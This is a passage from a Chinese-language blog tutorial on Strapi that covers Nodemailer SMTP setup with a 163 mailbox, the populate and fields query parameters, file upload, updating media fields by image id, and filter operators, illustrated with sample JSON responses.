href="#配置-email-provider"></a> <strong>配置 Email Provider</strong></h3><p>接下来，需要配置邮件提供商。</p><p>在 Strapi 中，邮件服务的配置文件位于 <code>config/plugins.js</code>。国内推荐 qq 或者网易邮箱（自行搜索邮箱开通 SMTP），这里介绍网易邮箱配置：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function">(<span class="params">{ env }</span>) =&gt;</span> ({</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="attr">email</span>: {</span><br><span class="line">    <span class="attr">config</span>: {</span><br><span class="line">      <span class="attr">provider</span>: <span class="string">"nodemailer"</span>,</span><br><span class="line">      <span class="attr">providerOptions</span>: {</span><br><span class="line">        <span class="attr">host</span>: <span class="title function_">env</span>(<span class="string">"SMTP_HOST"</span>), <span class="comment">// 网易邮箱SMTP服务器地址</span></span><br><span class="line">        <span class="attr">port</span>: <span class="title function_">env</span>(<span class="string">"SMTP_PORT"</span>), <span class="comment">// SSL端口</span></span><br><span class="line">        <span class="attr">secure</span>: <span class="literal">true</span>, <span class="comment">// 使用SSL</span></span><br><span class="line">        <span class="attr">auth</span>: {</span><br><span class="line">          <span class="attr">user</span>: <span class="title function_">env</span>(<span class="string">"SMTP_USERNAME"</span>), <span class="comment">// 网易邮箱账号</span></span><br><span class="line">          <span class="attr">pass</span>: <span class="title function_">env</span>(<span class="string">"SMTP_PASSWORD"</span>), <span class="comment">// 授权码</span></span><br><span class="line">        },</span><br><span class="line">        <span class="comment">// 其他自定义Nodemailer选项</span></span><br><span class="line">      },</span><br><span class="line">      <span class="attr">settings</span>: {</span><br><span class="line">        <span class="attr">defaultFrom</span>: <span class="title function_">env</span>(<span class="string">"SMTP_USERNAME"</span>),</span><br><span class="line">        <span class="attr">defaultReplyTo</span>: <span class="title function_">env</span>(<span class="string">"SMTP_PASSWORD"</span>),</span><br><span class="line">      },</span><br><span class="line">    },</span><br><span class="line">  },</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><h3 id="获取-smtp-授权码"><a class="markdownIt-Anchor" href="#获取-smtp-授权码"></a> 获取 SMTP 授权码</h3><ol><li>登录 163 邮箱。</li><li>打开 <strong>设置</strong> -&gt; <strong>POP3/SMTP/IMAP</strong>。</li><li>开启 <strong>SMTP</strong> 服务，并生成授权码（<strong>授权码只展示一次，请妥善保存</strong>）。</li></ol><p>在你的 <code>.env</code> 文件中设置相应的环境变量</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mail</span></span><br><span class="line">SMTP_HOST=smtp.163.com</span><br><span class="line">SMTP_PORT=465</span><br><span class="line">SMTP_USERNAME=your_mail0@163.com</span><br><span class="line">SMTP_PASSWORD=JBxxxxxxxxxxxxtreB</span><br></pre></td></tr></tbody></table></figure><h3 id="修改-template-模板"><a class="markdownIt-Anchor" href="#修改-template-模板"></a> 修改 template 模板</h3><p><strong>将模板中的发件人和刚才配置的插件文件中的发件人一致</strong></p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409232306287.png" alt="image-20240923230633136"></p><p>否则你可能遇到错误</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error: Mail <span class="built_in">command</span> failed: 501 Mail from address must be same as authorization user.</span><br></pre></td></tr></tbody></table></figure><h2 id="api-查询媒体数据"><a class="markdownIt-Anchor" href="#api-查询媒体数据"></a> API - 查询媒体数据</h2><p>在查询某些包含关系、媒体字段（图片、视频等）、组件或动态区域的接口时，如果不在查询参数中加上 <code>populate</code> 参数，Strapi 将默认不会查询返回，这是出于性能考虑。</p><p>例如 <code>/api/users/me</code> 接口，假设 Users 表中还包含一个 avatar 头像字段，则想要接口返回头像数据，应该是如下查询（<code>*</code> 表示查询所有关系）</p><figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:1337/api/users/me?populate=*</span><br></pre></td></tr></tbody></table></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409242108207.png" alt="image-20240924210837091"></p><blockquote><p>populate 参数中文文档参考：<a href="https://strapi.nodejs.cn/dev-docs/api/rest/populate-select/">https://strapi.nodejs.cn/dev-docs/api/rest/populate-select/</a></p></blockquote><h2 id="api-查询特定字段"><a class="markdownIt-Anchor" href="#api-查询特定字段"></a> API - 查询特定字段</h2><p>查询请求可以接受 <code>fields</code> 参数来<strong>仅选择</strong>某些字段。默认情况下，仅返回以下 <a href="https://strapi.nodejs.cn/dev-docs/backend-customization/models#model-attributes">字段类型</a>：</p><ul><li>字符串类型：字符串、文本、富文本、枚举、电子邮件、密码和 uid，</li><li>日期类型：日期、时间、日期时间和时间戳，</li><li>号码类型：整数、大整数、浮点数和小数，</li><li>通用类型：布尔值、数组和 JSON。</li></ul><blockquote><p>字段选择不适用于关系、媒体、组件或动态区域字段。要填充这些字段，请使用 <a href="https://strapi.nodejs.cn/dev-docs/api/rest/populate-select/#population"><code>populate</code> 参数</a>。</p></blockquote><p>该参数可以限制响应的数据字段，可以使得某些数据不被暴露，一定程度提高安全性和数据简洁性。</p><p>例如 <code>/api/users/me</code> 接口，查询所有的关系返回数据为</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"id"</span><span class="punctuation">:</span> <span class="number">11</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"documentId"</span><span class="punctuation">:</span> <span class="string">"dtree1c2woi3njmz56xmttcm"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"username"</span><span class="punctuation">:</span> <span class="string">"xiaowu1"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"email"</span><span class="punctuation">:</span> <span class="string">"1681237971@qq.com"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"provider"</span><span class="punctuation">:</span> <span class="string">"local"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"confirmed"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"blocked"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-23T16:06:23.045Z"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-24T12:51:20.561Z"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"publishedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-24T12:51:20.528Z"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"locale"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"avatar"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"id"</span><span class="punctuation">:</span> <span class="number">32</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"documentId"</span><span class="punctuation">:</span> <span class="string">"nq7hj2shguktf5begtsluvup"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"头像.jpg"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"alternativeText"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"caption"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"width"</span><span class="punctuation">:</span> <span class="number">350</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"height"</span><span class="punctuation">:</span> <span class="number">350</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"formats"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"thumbnail"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"ext"</span><span class="punctuation">:</span> <span class="string">".jpg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"url"</span><span class="punctuation">:</span> <span class="string">"/uploads/thumbnail__993e719107.jpg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"hash"</span><span class="punctuation">:</span> <span class="string">"thumbnail__993e719107"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"mime"</span><span class="punctuation">:</span> <span class="string">"image/jpeg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"thumbnail_头像.jpg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"path"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"size"</span><span class="punctuation">:</span> <span class="number">7.37</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"width"</span><span class="punctuation">:</span> <span class="number">156</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"height"</span><span class="punctuation">:</span> <span class="number">156</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"sizeInBytes"</span><span class="punctuation">:</span> <span class="number">7369</span></span><br><span class="line">      <span class="punctuation">}</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"hash"</span><span class="punctuation">:</span> <span class="string">"_993e719107"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"ext"</span><span class="punctuation">:</span> <span class="string">".jpg"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"mime"</span><span class="punctuation">:</span> <span class="string">"image/jpeg"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"size"</span><span class="punctuation">:</span> <span class="number">20.89</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"url"</span><span class="punctuation">:</span> <span class="string">"/uploads/_993e719107.jpg"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"previewUrl"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"provider"</span><span class="punctuation">:</span> <span class="string">"local"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"provider_metadata"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-24T12:51:16.512Z"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-24T12:51:16.512Z"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"publishedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-24T12:51:16.513Z"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"locale"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><p>如果带上下面的请求参数</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/users/me?fields=username,email,createdAt,updatedAt,<span class="built_in">id</span>&amp;populate[avatar][fields]=<span class="built_in">id</span>,height,width,name,updatedAt,ext</span><br></pre></td></tr></tbody></table></figure><p>则返回数据为</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"id"</span><span class="punctuation">:</span> <span class="number">11</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"documentId"</span><span class="punctuation">:</span> <span class="string">"dtree1c2woi3njmz56xmttcm"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"username"</span><span class="punctuation">:</span> <span class="string">"xiaowu1"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"email"</span><span class="punctuation">:</span> <span class="string">"1681237971@qq.com"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-23T16:06:23.045Z"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-24T12:51:20.561Z"</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">"avatar"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"id"</span><span class="punctuation">:</span> <span class="number">32</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"documentId"</span><span class="punctuation">:</span> <span class="string">"nq7hj2shguktf5begtsluvup"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"height"</span><span class="punctuation">:</span> <span class="number">350</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"width"</span><span class="punctuation">:</span> <span class="number">350</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"头像.jpg"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-24T12:51:16.512Z"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"ext"</span><span class="punctuation">:</span> <span class="string">".jpg"</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><h3 id="参数解释"><a class="markdownIt-Anchor" href="#参数解释"></a> 参数解释</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/users/me?fields=username,email,createdAt,updatedAt,<span class="built_in">id</span>&amp;populate[avatar][fields]=<span class="built_in">id</span>,height,width,name,updatedAt,ext</span><br></pre></td></tr></tbody></table></figure><p><code>fields</code> 关键字表示要进行第一级的字段选取，<code>populate[第一个参数][第二个参数]</code> 的第一个中括号参数为第二级字段的根节点（这里是 <code>avatar</code>），接着第二个中括号写 <code>fields</code> 关键字，表示要进行选取的字段名，这里是 <code>id,height,width,name,updatedAt,ext</code></p><h2 id="api-文件上传"><a class="markdownIt-Anchor" href="#api-文件上传"></a> API - 文件上传</h2><p>Strapi 的文件上传除了在管理面板中进行上传之外，还可以通过接口的方式进行上传（Strapi 支持 blob、base64 上传，请提前给予权限）</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409260028631.png" alt="image-20240926002852546"></p><p>请在接口前加上 /api，即：</p><figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:1337/api/upload</span><br></pre></td></tr></tbody></table></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409260029602.png" alt="image-20240926002913544"></p><p>例如在 apifox 中进行测试：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409260033256.png" alt="image-20240926003359170"></p><h2 id="api-更新包含媒体字段的数据"><a class="markdownIt-Anchor" href="#api-更新包含媒体字段的数据"></a> API - 更新包含媒体字段的数据</h2><p>那么如果我创建了一个数据表其中包含一个媒体字段，如何更新该表中的数据？</p><p>假设该表如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409260036848.png" alt="image-20240926003626793"></p><p>请求接口为：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /api/articles/:<span class="built_in">id</span></span><br></pre></td></tr></tbody></table></figure><p>访问接口文档插件的地址，你会发现它的示例如下：</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"data"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"title"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"content"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"cover_img"</span><span class="punctuation">:</span> <span class="string">"string or id"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"state"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"article_category"</span><span class="punctuation">:</span> <span class="string">"string or id"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"author"</span><span class="punctuation">:</span> <span class="string">"string or id"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"locale"</span><span class="punctuation">:</span> <span class="string">"string"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"localizations"</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">"string or id"</span><span class="punctuation">,</span> <span class="string">"string or id"</span><span class="punctuation">]</span></span><br><span class="line">  <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure><p><code>"cover_img": "string or id"</code></p><p>string 或者 id？string 说是网络地址我都能理解，id 是什么？</p><ul><li>实际上该接口仅仅允许你<strong>通过已经上传的图片 id 进行设置 cover_img</strong></li></ul><p><strong>也就是说你要先将更换好的图片进行上传，然后得到它的 id，再将该 id 赋值给 cover_img 才行</strong></p><p><s>折腾了我一晚上，各种曲线救国写的累死人，没想到随意一个测试，原来是这样的…… 哈哈 😎😎</s></p><h2 id="api-strapi-条件查询"><a class="markdownIt-Anchor" href="#api-strapi-条件查询"></a> API-Strapi 条件查询</h2><p>Strapi 如何进行条件查询？</p><blockquote><p>参考文档：</p><ul><li>文档服务 API 可用方法：<a href="https://strapi.nodejs.cn/dev-docs/api/document-service">https://strapi.nodejs.cn/dev-docs/api/document-service</a></li><li> 文档服务 API 过滤器：<a href="https://strapi.nodejs.cn/dev-docs/api/document-service/filters">https://strapi.nodejs.cn/dev-docs/api/document-service/filters</a></li></ul></blockquote><p>总之，Strapi 提供了一些常见的查询操作符，我们可以通过这些操作符进行各种条件查询。常用操作符包括：</p><table><thead><tr><th>操作符</th><th>含义</th><th>示例</th></tr></thead><tbody><tr><td><code>$eq</code></td><td>等于</td><td><code>filters[title][$eq]=Vue.js Tutorial</code></td></tr><tr><td><code>$ne</code></td><td>不等于</td><td><code>filters[title][$ne]=Vue.js Tutorial</code></td></tr><tr><td><code>$lt</code></td><td>小于</td><td><code>filters[views][$lt]=1000</code></td></tr><tr><td><code>$lte</code></td><td>小于等于</td><td><code>filters[views][$lte]=1000</code></td></tr><tr><td><code>$gt</code></td><td>大于</td><td><code>filters[views][$gt]=1000</code></td></tr><tr><td><code>$gte</code></td><td>大于等于</td><td><code>filters[views][$gte]=1000</code></td></tr><tr><td><code>$contains</code></td><td>包含（字符串部分匹配）</td><td><code>filters[title][$contains]=Vue</code></td></tr><tr><td><code>$startsWith</code></td><td>以指定字符串开头</td><td><code>filters[title][$startsWith]=Vue</code></td></tr><tr><td><code>$endsWith</code></td><td>以指定字符串结尾</td><td><code>filters[title][$endsWith]=Tutorial</code></td></tr><tr><td><code>$null</code></td><td>字段值为空</td><td><code>filters[coverImage][$null]=true</code></td></tr><tr><td><code>$in</code></td><td>在给定数组中</td><td><code>filters[category][$in][0]=News</code></td></tr><tr><td><code>$between</code></td><td>在两个值之间</td><td><code>filters[views][$between][0]=10&amp;filters[views][$between][1]=100</code></td></tr></tbody></table><p>示例</p><p>查询 <code>views</code> 字段在 100 和 1000 之间的文章：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/articles?filters[views][<span class="variable">$gte</span>]=100&amp;filters[views][<span class="variable">$lte</span>]=1000</span><br></pre></td></tr></tbody></table></figure><p>查询 <code>category</code> 是 "Tech" 或 "News" 的文章：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /api/articles?filters[category][<span class="variable">$in</span>][0]=Tech&amp;filters[category][<span class="variable">$in</span>][1]=News</span><br></pre></td></tr></tbody></table></figure><p>假设数据如下（接口是：/api/articles）</p><figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">  <span class="attr">"data"</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"documentId"</span><span class="punctuation">:</span> <span class="string">"fuki5p5xzjnk5n7vfvwzv9c4"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"title"</span><span class="punctuation">:</span> <span class="string">"CTF-WP"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"content"</span><span class="punctuation">:</span> <span class="string">"&lt;p&gt;这是一份测试内容数据321&lt;/p&gt;"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"state"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T05:29:27.298Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T17:15:03.198Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"publishedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T17:15:03.188Z"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"cover_img"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"id"</span><span class="punctuation">:</span> <span class="number">45</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"documentId"</span><span class="punctuation">:</span> <span class="string">"nzpwo3hy9qkesr5l0uqd1k02"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"name"</span><span class="punctuation">:</span> <span class="string">"1607569780_678488.jpg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"alternativeText"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"caption"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"width"</span><span class="punctuation">:</span> <span class="number">1920</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"height"</span><span class="punctuation">:</span> <span class="number">1080</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"ext"</span><span class="punctuation">:</span> <span class="string">".jpg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"mime"</span><span class="punctuation">:</span> <span class="string">"image/jpeg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"url"</span><span class="punctuation">:</span> <span class="string">"/uploads/1607569780_678488_991350393d.jpg"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T17:15:03.111Z"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T17:15:03.111Z"</span></span><br><span class="line">      <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"article_category"</span><span class="punctuation">:</span> <span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"id"</span><span class="punctuation">:</span> <span class="number">6</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"documentId"</span><span class="punctuation">:</span> <span class="string">"qznn6b3nxzqxyv9qlzyu6t65"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"category_name"</span><span class="punctuation">:</span> <span class="string">"mod修改"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"category_alias"</span><span class="punctuation">:</span> <span class="string">"mod"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T07:58:18.423Z"</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">"updatedAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T07:58:18.423Z"</span></span><br><span class="line">      <span class="punctuation">}</span></span><br><span class="line">    <span class="punctuation">}</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">{</span></span><br><span class="line">      <span class="attr">"id"</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"documentId"</span><span class="punctuation">:</span> <span class="string">"hevczglj0hqyjc5h5zva0cb9"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"title"</span><span class="punctuation">:</span> <span class="string">"这是测试新增文章的标"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"content"</span><span class="punctuation">:</span> <span class="string">"&lt;p&gt;托尔斯泰&lt;/p&gt;"</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"state"</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">"createdAt"</span><span class="punctuation">:</span> <span class="string">"2024-09-25T17:33:11.929Z"</span><span 